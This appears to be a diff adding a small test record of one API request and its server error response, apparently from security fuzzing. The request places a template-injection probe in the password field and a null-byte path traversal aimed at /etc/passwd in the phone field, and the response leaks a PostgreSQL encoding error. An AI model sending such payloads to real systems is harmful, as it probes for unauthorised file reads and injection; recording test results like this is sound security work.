@@ -1,0 +1,6 @@
+
+Request:
+{"name":"wahyu","password":"${42*42}","phone":"../../../../../../../../../../../../etc/passwd\u0000"}
+
+Responses:
+{"code":"Internal Server Error","message":"pq: invalid byte sequence for encoding \"UTF8\": 0x00","serverTime":1645898883545}
